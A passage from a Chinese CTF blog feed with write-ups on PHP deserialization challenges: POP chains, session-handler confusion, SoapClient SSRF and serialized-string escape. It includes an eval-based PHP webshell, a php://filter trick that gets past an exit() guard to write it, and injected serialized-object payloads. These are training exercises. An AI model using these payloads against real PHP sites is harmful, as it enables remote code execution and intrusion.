class="line">              PlaySound(2);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，当player.win的时候，会执行一个winTimer.Set();，我们直接在运行台输入，就可以得到flag</p><p>#后记</p><p>游戏的题目一般都会跟JS有关，可以在空闲的时候对JS有个了解，不至于一点都看不懂</p><p>当出现题目是游戏的时候，我们应该首先搞懂这个游戏是怎么玩的，然后看JS里面有没有跟通关这个游戏有关的函数代码，或在控制台中运行，在源代码中修改然后保存，不要刷新界面，否则会丢失数据</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MIS  Ezpop</title>
      <link href="/2021/03/17/Ezpop/"/>
      <url>/2021/03/17/Ezpop/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>这题的代码太长了，基础太差实在审不下去</p><span id="more"></span><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line"></span><br><span class="line">   protected $store;</span><br><span class="line"></span><br><span class="line">   protected $key;</span><br><span class="line"></span><br><span class="line">   protected $expire;</span><br><span class="line"></span><br><span class="line">   public function __construct($store, $key &#x3D; &#39;flysystem&#39;, $expire &#x3D; null) &#123;</span><br><span class="line">       $this-&gt;key &#x3D; $key;</span><br><span class="line">       $this-&gt;store &#x3D; $store;</span><br><span class="line">       $this-&gt;expire &#x3D; $expire;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function cleanContents(array $contents) &#123;</span><br><span class="line">       $cachedProperties &#x3D; array_flip([</span><br><span class="line">           &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,</span><br><span class="line">           &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,</span><br><span class="line">       ]);</span><br><span class="line"></span><br><span class="line">       foreach ($contents as $path &#x3D;&gt; $object) &#123;</span><br><span class="line">           if (is_array($object)) &#123;</span><br><span class="line">               $contents[$path] &#x3D; array_intersect_key($object, $cachedProperties);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return $contents;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function getForStorage() &#123;</span><br><span class="line">       $cleaned &#x3D; $this-&gt;cleanContents($this-&gt;cache);</span><br><span class="line"></span><br><span class="line">       return json_encode([$cleaned, $this-&gt;complete]);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function save() &#123;</span><br><span class="line">       $contents &#x3D; $this-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">       $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function __destruct() &#123;</span><br><span class="line">       if (!$this-&gt;autosave) &#123;</span><br><span class="line">           $this-&gt;save();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class B &#123;</span><br><span class="line"></span><br><span class="line">   protected function getExpireTime($expire): int &#123;</span><br><span class="line">       return (int) $expire;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function getCacheKey(string $name): string &#123;</span><br><span class="line">       return $this-&gt;options[&#39;prefix&#39;] . $name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   protected function serialize($data): string &#123;</span><br><span class="line">       if (is_numeric($data)) &#123;</span><br><span class="line">           return (string) $data;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $serialize &#x3D; $this-&gt;options[&#39;serialize&#39;];</span><br><span class="line"></span><br><span class="line">       return $serialize($data);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function set($name, $value, $expire &#x3D; null): bool&#123;</span><br><span class="line">       $this-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">       if (is_null($expire)) &#123;</span><br><span class="line">           $expire &#x3D; $this-&gt;options[&#39;expire&#39;];</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $expire &#x3D; $this-&gt;getExpireTime($expire);</span><br><span class="line">       $filename &#x3D; $this-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">       $dir &#x3D; dirname($filename);</span><br><span class="line"></span><br><span class="line">       if (!is_dir($dir)) &#123;</span><br><span class="line">           try &#123;</span><br><span class="line">               mkdir($dir, 0755, true);</span><br><span class="line">           &#125; catch (\Exception $e) &#123;</span><br><span class="line">               &#x2F;&#x2F; 创建失败</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $data &#x3D; $this-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">       if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;</span><br><span class="line">           &#x2F;&#x2F;数据压缩</span><br><span class="line">           $data &#x3D; gzcompress($data, 3);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $data &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br><span class="line">       $result &#x3D; file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">       if ($result) &#123;</span><br><span class="line">           return true;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return false;</span><br><span class="line">   &#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;src&#39;])) &#123;</span><br><span class="line">   highlight_file(__FILE__);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">$dir &#x3D; &quot;uploads&#x2F;&quot;;</span><br><span class="line"></span><br><span class="line">if (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">   mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&quot;data&quot;]);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>首先看A类</strong></p><p>定义了三个被保护的变量，也就明确了只能在本类中调用，然后<code>__construct方法</code>，初始化</p><p>然后看到<code>cleanContents</code></p><p><code>array_flip</code>反转数组中所有的键以及他们关联的值</p><p><code>array_intersert_key</code>,比较两个数组的键名，并返回交集。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public function getForStorage() &#123;</span><br><span class="line">       $cleaned &#x3D; $this-&gt;cleanContents($this-&gt;cache);</span><br><span class="line">       return json_encode([$cleaned, $this-&gt;complete]);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>然后，我们看到类save中调用了一个set函数，但是我们会发现A类中并没有save函数，所以我们来到了B类</p><p>直接先来看set函数把</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public function set($name, $value, $expire &#x3D; null): bool&#123;</span><br><span class="line">       $this-&gt;writeTimes++;</span><br><span class="line">       if (is_null($expire)) &#123;</span><br><span class="line">           $expire &#x3D; $this-&gt;options[&#39;expire&#39;];</span><br><span class="line">       &#125;</span><br><span class="line">       $expire &#x3D; $this-&gt;getExpireTime($expire);</span><br><span class="line">       $filename &#x3D; $this-&gt;getCacheKey($name);</span><br><span class="line">       $dir &#x3D; dirname($filename);</span><br><span class="line">       if (!is_dir($dir)) &#123;</span><br><span class="line">           try &#123;</span><br><span class="line">               mkdir($dir, 0755, true);</span><br><span class="line">           &#125; catch (\Exception $e) &#123;</span><br><span class="line">               &#x2F;&#x2F; 创建失败</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       $data &#x3D; $this-&gt;serialize($value);</span><br><span class="line">       if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;</span><br><span class="line">           &#x2F;&#x2F;数据压缩</span><br><span class="line">           $data &#x3D; gzcompress($data, 3);</span><br><span class="line">       &#125;</span><br><span class="line">       $data &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br><span class="line">       $result &#x3D; file_put_contents($filename, $data);</span><br><span class="line">       if ($result) &#123;</span><br><span class="line">           return true;</span><br><span class="line">       &#125;</span><br><span class="line">       return false;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>传入三个参数$name, $value, $expire = null，所以现在来说name就是key，value就是contents，expire被强化为null</p><pre><code>    if (is_null($expire)) &#123;        $expire = $this-&gt;options[&#39;expire&#39;];    &#125;</code></pre><p>我们可以看到，所以expire的值是我们可控的</p><pre><code>    $expire = $this-&gt;getExpireTime($expire);</code></pre><p>·</p><pre><code>     protected function getExpireTime($expire): int &#123;    return (int) $expire;&#125;</code></pre><p>但是这里又把expire转化为int类型，我感觉对我们暂时没有什么帮助</p><pre><code>    $filename = $this-&gt;getCacheKey($name);</code></pre><p>·</p><pre><code>    public function getCacheKey(string $name): string &#123;    return $this-&gt;options[&#39;prefix&#39;] . $name;&#125;</code></pre><p>返回了一个拼接值</p><pre><code>    $dir = dirname($filename);</code></pre><li>dirname() 函数返回路径中的目录部分。<p>例子```&lt;?php<br>echo dirname(“c:/testweb/home.php”);</p><p>echo dirname(“/testweb/home.php”);<br>?&gt;```</p><p>输出`c:/testweb</p><p>/testweb`</p><pre><code>    $data = $this-&gt;serialize($value);</code></pre><p>value就是content传入的值</p><pre><code>     protected function serialize($data): string &#123;    if (is_numeric($data)) &#123;        return (string) $data;    &#125;    $serialize = $this-&gt;options[&#39;serialize&#39;];    return $serialize($data);&#125;</code></pre><p>最后一个$serialize($data)，这是个啥？？？</p><pre><code>    $data = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;    $result = file_put_contents($filename, $data);</code></pre><p>如果就是filename是个路径，data是个文件名，然后，重点是，这有一个死亡exit，<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">P神的文章</a></p><p>大概思路清理一下</p><p>new class A，然后触发__destruct(),因为就没有autosave这个东西，所以触发save</p><p>控制cache，cache可以是 ‘path’, ‘dirname’, ‘basename’, ‘extension’, ‘filename’,’size’, ‘mimetype’, ‘visibility’, ‘timestamp’, ‘type’。</p><p>然后控制complete，返回json串，另外key的值也是可以改变的，然后九是filename，还有data，去使用file_name_contents,得到flag</p><p>然后九不会了，现在要想的就是怎么绕过死亡exit（），P神曰：由于&lt;、?、()、;、&gt;、\n都不是base64编码的范围，所以base64解码的时候会自动将其忽略，所以解码之后就剩php//exit了，这里有9个字符，但是呢base64算法解码时是4个字节一组，所以我们还需要在前面加些字符，我就加3个字符吧，最后我们可以使用php伪协议来绕过，一会写在路径里就行</p><pre><code>    php://filter/write=convert.base64-decode/resource=    sprintf(&#39;%012d&#39;, $expire)</code></pre><p>我实验了一下，%012d,不管expire是什么都会补为12个数，正好是4的倍数，所以没有什么影响</p><p> data来写shell，加上3个字符，就像刚才所说，data-&gt;value-&gt;contents（json形势）-&gt;cache</p><p>json格式的字符都不满足base64编码的要求，所以我们可以将数据进行base64编码绕过</p><p><img src="1.PNG"></p><pre><code>    A-&gt;complete=base64_encode(&#39;xxx&#39;,base64_encode(&#39;&lt;?php @eval($_POST[&quot;ro4lsc&quot;]);?&gt;&#39;))  //这里的xxx就是为了和php//exit一起凑够4的倍数</code></pre><p>现在最重要的问题是怎么把base64两次解码，一次解码已经决定在路径里用php协议解码一次，那还有一次得再找方法解码<br>这时我们就得看到前面提到的serialize函数</p><pre><code>     protected function serialize($data): string &#123;    if (is_numeric($data)) &#123;        return (string) $data;    &#125;    $serialize = $this-&gt;options[&#39;serialize&#39;];    return $serialize($data);&#125;</code></pre><p>可以看到返回值是 s e r i a l i z e ( serialize( serialize(data)，也就是说这里我们可以让这个变量$serilalize为base64_decode函数对data变量进行解码。(解答我上面的疑惑了！！！！)</p><p>filename参数是options[‘prefix’]和 n a m e 进 行 拼 接 的 结 果 ， 而 这 里 的 name进行拼接的结果，而这里的 name进行拼接的结果，而这里的name是形参，所以这个$name是A类的key变量，是由save函数传递过来的<br>由于options[‘prefix’]可控</p><pre><code>    options[&#39;prefix&#39;]=&quot;php://filter/write=convert.base64-decode/resource=&quot;;    key=&quot;webshell.php&quot;; //$name</code></pre><p>·</p><pre><code>    A::__destruct-&gt;save()-&gt;getForStorage()-&gt;cleanStorage()       B::save()-&gt;set()-&gt;getExpireTime()，getCacheKey()，serialize()-&gt;file_put_contents写入shell</code></pre><p>·</p><pre><code>    key-&gt;name-&gt;filename       //key可控    cache-&gt;clean+complete-&gt;contents-&gt;value-&gt;data    //cache和complete可控    expire   //expire可控</code></pre><p><img src="2.PNG"></p><p>访问shell.php</p><p>刚才在想一个问题options[‘prefix’]=”php://filter/write=convert.base64-decode/resource=”; key=”webshell.php”;，为社么要这样写，就是相当于拼接了一个伪协议在文件的前面，便于解码</p><p><img src="1.PNG"></p><p>#后记</p><p>感觉这道题只做一次并没有完全的吃透，感觉还要再来一次，代码审计确实太累了，这么长的代码直接给我整蒙了，一开始的时候</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow  267-270</title>
      <link href="/2021/03/15/267-270/"/>
      <url>/2021/03/15/267-270/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>复现yii2  <a href="https://www.cnblogs.com/thresh/p/13743081.html">https://www.cnblogs.com/thresh/p/13743081.html</a></p><p>267</p><p>打开后可以看都有一个登录界面，弱密码爆破（因为我把yii2复现了，看到里面的用户名密码，有两个，admin,admin和demo，demo）</p><p>两个都可以成功登录</p><p>打开about，里面有一个view-source,这里有点奇怪是构造 r=   &amp;view-source</p><p>/backdoor/shell<br>unserialize(base64_decode($_GET[‘code’])),然后可以看到这个提示</p><p><img src="1.PNG"></p><p>这里的这个passthru，跟system一样但是system被过滤了就不行了</p><p>268</p><p>flag被过滤，改为fl*</p><p>269</p><p>同268</p><p>270</p><p>用poc4，就可以了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buueasypop</title>
      <link href="/2021/03/14/buueasypop/"/>
      <url>/2021/03/14/buueasypop/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>第一次做的时候，搞得不是特别懂，现在把题目在细细的扣一扣</p><span id="more"></span><p>题目源码</p><p><img src="1.PNG"></p><p>先分析下，题目有说flag在flag.php中，而且整个代码的漏洞就在Modifier这个类中，有个include，所以我们可以通过伪协议读取flag.php,这里有一个魔术方法/_/<em>invoke(当尝试以调用函数的方式调用一个对象时，该方法会被自动调用).,这里我们可以看到在类Test中，有一个return $function();所以这里就是我们触发invoke的关键，但是问题是我们要怎样才能触发Test这个类讷，于是我们可以看到在Test中有一个魔术方法/</em>/_get,get方法在官网上找到的是如果在类外面调用一个私有属性的话会触发这个函数，但是实际上如果调用类里面不存在的属性也会触发，于是我们可以看到在Show这个类里面有一个__tostring()魔术方法，这个是如果当一个类被当成字符串的时候就会触发。所以综上我们反着来</p><p>1.触发tostring<br>2.触发get<br>3.触发invoke<br>4.伪协议读取</p><p>先一步步的探索</p><p>1.如何触发get</p><p><img src="2.PNG"></p><p>解释一下exp</p><p>先new Show,把对象实例化然后赋给a，a给str赋值为new Test(),然后在把$a当作字符串传入，这时候wakeup()这就可以触发了，然后在tostring这里因为source不是Test中的属性，所以成功触发get魔术方法</p><p>然后</p><p><img src="3.PNG"></p><p>ammmm不想分析了，但是记得记得，php://filter/read=convert.base64-encode/resource=flag.php,这里flag.php不能加引号！！！！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>henu mai</title>
      <link href="/2021/03/14/mai/"/>
      <url>/2021/03/14/mai/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>学习反序列化之后，打开了那道上星期让我头蒙了3个小时的题目，其实现在看还挺简单的，主要当时就没有听说过pop链这个词就。</p><span id="more"></span><p>我当时做的时候，只是知道当把类当作字符串输出的时候会触发__tostring()这个魔术方法，但是因为题目并没有给echo，所以当时就卡在这里了</p><p>其实当类被当成字符串就会触发tostring这个魔术方法，所以触发点就在flag这个类的__wake up这个魔术方法这里</p><p>当时我还奇怪来着，为撒子这里要有个比较，</p><p><img src="1.PNG"></p><p>很是莫名其妙，现在看来就是这里，如果我们令$this-&gt;baby=new baby()，就可以触发tostring，于是我们构造</p><p><img src="2.PNG"></p><p>就得到key</p><p>key:mishenyyds</p><p>于是下面就简单了</p><p><img src="3.PNG"></p><p><img src="4.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化 ctfshow 265</title>
      <link href="/2021/03/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%AC%E4%B8%89%E5%BC%B9/"/>
      <url>/2021/03/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%AC%E4%B8%89%E5%BC%B9/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>265</p><p><img src="1.PNG"></p><p>题目意思很简单就是，token==password,即可</p><p>但是token我们也有看到$ctfshow-&gt;token=md5(mt_rand());，token被随机赋了一个值</p><p>所以就引入了一个新的知识 &amp;</p><p>先看一个实验</p><p><img src="2.PNG"></p><p>我们会发现a的值会跟着b改变，于是我们构造</p><p><img src="3.PNG"></p><p>得到flag<br>另外注意不要 public $token=&amp;$password,会出现报错</p><p>266</p><p>一个点，php大小写：函数名和类名不区分，但是变量名区分</p><p>其实这题挺简单的</p><p><img src="4.PNG"></p><p>bp，hackbar传参</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化 ctfshow 263 264</title>
      <link href="/2021/03/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%AC%E4%BA%8C%E5%BC%B9/"/>
      <url>/2021/03/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%AC%E4%BA%8C%E5%BC%B9/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>php-session反序列化</p><p>前置知识</p><p>php中的session不是存在内存中的，而是以文件的方式进行存储，配置项session.save_handler来决定，以session_sessionid来进行命名</p><li>php  默认以此方式进行命名，键名|经过serailize函数进行处理的<li>php_serailize   经过serialize()函数反序列化的数组<li>php_binary   键名的长度对对应的ASCII字符，键名，serialize序列化处理的值<p>php.ini中的一些配置</p><p>session.save_path=”” 一些session的存储路径</p><p>session.save_handler=”” 设定用户自定义存储函数，如果使用php内置会话存储机制之外的可以使用该函数</p><p>session.auto_start boolen 指定会话模块是否在请求开始的时候启动一个会话，默认不启动，0</p><p>session.serialize_handler string–定义用来序列化/反序列化的处理器名字。默认使用php</p><p>今天学会了一个新的工具，seay代码审计，虽然对这道题没有太大的帮助，但真的太i了，我本来代码审计就特别弱。不过还是要加强自己审计的能力。</p><p>题目打开是登录页面，啥都没有就扫目录，<a href="http://www.zip/">www.zip</a></p><p><img src="1.PNG"></p><p>我们访问index.php网页后，就会把我们访问的信息写入cookie，base64编码的</p><p>在check.php提示我们</p><p><img src="2.PNG"></p><p>可以看到inc.php,中有</p><p><img src="3.PNG"></p><p>所以猜测，这应该是有php_serailize，方式存在的。这应该就是我们的注入点</p><p><img src="4.PNG"></p><p>看到这里的file_get_contents</p><p><img src="5.PNG"></p><p>审计报告里也说明了，这里存在文件包含漏洞</p><p><img src="6.PNG"></p><p>这样的话，当我们在访问check.php的时候，就会生成log-1.php</p><p>另外，如果同时出现php,php serialize这两种存储方式，那么会出现错乱，做个实验</p><p>shiyan.php</p><p><img src="7.PNG"></p><p>flag.php</p><p><img src="8.PNG"></p><p>反序列化</p><p><img src="9.PNG"></p><p>我们在shiyan。php输入?a=|O:4:”test”:1:{s:4:”name”;s:4:”haha”;}</p><p>查看flag.php</p><p>输出haha</p><p>由于1.php是使用php_serialize引擎处理，因此只会把’|’当做一个正常的字符。然后访问2.php，由于用的是php引擎，因此遇到’|’时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对’|’后的值进行反序列化处理。</p><p>这里可能会有一个小疑问，为什么在解析session文件时直接对’|’后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明：</p><p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</p><p>因此我们成功触发了test类中的__wakeup()方法,所以这种攻击思路是可行的。</p><p>回到题目</p><p>我们首先访问/index.php,生成cookie，然后传入limit=我们序列化的字符串，然后访问check.php,因为这里有</p><p><img src="10.PNG"></p><p>最后生成log-1.php,访问源码得到flag</p><p>264</p><p>就跟262一样，传个cookie值就好了，记得引号要编码</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化 ctfshow 258，259，260，261</title>
      <link href="/2021/03/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/03/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>258</p><p><img src="1.PNG"></p><p>设置username，password，user在cookie反序列化，正则[oc]:\d+:/i’，就是不能输入 o:4:之类的，可以通过在o后面添加+绕过<br>我们可以看到在__construct这里是new一个info（）类，但是在backdoor这里有eval，这才是我们想要的。<br>所以</p><p><img src="2.PNG"></p><p>记得在o后面加上+号的编码%2b</p><p>259</p><p>千万记得，写完之后要保存，写了那么多的东西全没了</p><p>这道题利用了php反序列化，原生类soapclient.</p><p><img src="3.png"></p><p>soapclient(null,location,uli)</p><p><img src="4.PNG"></p><p>就说下思路，</p><p><img src="5.PNG"></p><p>打开题目啥都没有，就说让反序列化，就没有给类，所以我们就应该去想内置类，题目给了源码</p><p><img src="6.PNG"></p><p>flag.php</p><p>$xff = explode(‘,’, $_SERVER[‘HTTP_X_FORWARDED_FOR’]);<br>//把传过来的ip用‘，’，分割，形成数组</p><p>array_pop($xff);//去掉数组的最后一项</p><p>$ip = array_pop($xff);</p><p>if($ip!==’127.0.0.1’){</p><p> die(‘error’);//Ip=127.0.0.1</p><p>}else{</p><p>  $token = $_POST[‘token’];//post传参，使得token=ctfshow</p><p>  if($token==’ctfshow’){</p><p>  file_put_contents(‘flag.txt’,$flag);读取flag.php<br>  }<br>}</p><p>使用soapclient cluf ssrf</p><p>new soapclient，让第一个参数为null，这样我们可以使用location去构造ssrf，<a href="http://127.0.0.1/flag.php,%E7%84%B6%E5%90%8E%E4%BC%A0%E5%85%A5%E6%88%91%E4%BB%AC%E8%87%AA%E5%B7%B1%E6%9E%84%E9%80%A0%E7%9A%84post%E8%AF%B7%E6%B1%82%EF%BC%8C/r/n%E6%98%AF%E5%9B%9E%E8%BD%A6%EF%BC%8C%E4%B8%A4%E4%B8%AA/r/n%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8E%BB%E8%BF%9B%E8%A1%8C%E8%87%AA%E5%B7%B1%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82%E7%88%86">http://127.0.0.1/flag.php,然后传入我们自己构造的post请求，\r\n是回车，两个\r\n就可以去进行自己构造请求爆</a></p><p><img src="4.PNG"></p><p>我自己写的是直接传的\r\n,而不是后来在替换，所以一开始序列化出来的东西是不完整的</p><p>260</p><p>直接传入ctfhsow=ctfshow_i_love_36D就可以了</p><p>262</p><p>这个是利用了字符串逃逸</p><p>md，这道题的提示居然在注释里，绝了</p><p><img src="7.PNG"></p><p><img src="8.PNG"></p><p>这个源码挺简单的，就是，说如果token==’admin’，就输出flag</p><p><img src="9.PNG"></p><p>我们可以做一个实验</p><p><img src="10.PNG"></p><p><img src="11.PNG"></p><p>看这里，是不是有点奇怪，为什么要有fuck，为什么要把fuck换位loveu，而LOVEU比fuck多了一位</p><p><img src="12.PNG"></p><p>因为token这个在contruct里面没有，并不受我们控制，但是我们可以控制其他三个属性啊，又是一个跟闭合有关的</p><p>还记得我们刚才的实验结果嘛：O:7:”message”:4:{s:4:”from”;s:1:”1”;s:3:”msg”;s:1:”1”;s:2:”to”;s:1:”1”;<mark>s:5:”token”;s:4:”user”</mark>;}</p><p>如果我们传入(27个fuck，因为”;s:5:”token”;s:4:”user”;}，一共27个字符，需要我么传入27个字符去吃掉后面的，为其腾位置)</p><p>f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck”;s:5:”token”;s:5:”admin”;}</p><p>结果O:7:”message”:4:{s:4:”from”;s:1:”1”;s:3:”msg”;s:1:”1”;s:2:”to”;s:134:”fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck;s:5:”token”;s:5:”admin”;}”;s:5:”token”;s:4:”user”;}</p><p>那我们现在加上替换</p><p>O:7:”message”:4:{s:4:”from”;s:1:”1”;s:3:”msg”;s:1:”1”;s:2:”to”;s:134:”loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU”;s:5:”token”;s:5:”admin”;}”;s:5:”token”;s:4:”user”;}</p><p>注意s:134都是134个字符没有改变。那我们在反序列化的时候，服务器一定会认准134这个长度，后面形成闭合，自动舍去，于是我们就是改变token的值，得到访问message.php,得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ezpop</title>
      <link href="/2021/03/08/pop%E9%93%BE/"/>
      <url>/2021/03/08/pop%E9%93%BE/</url>
      
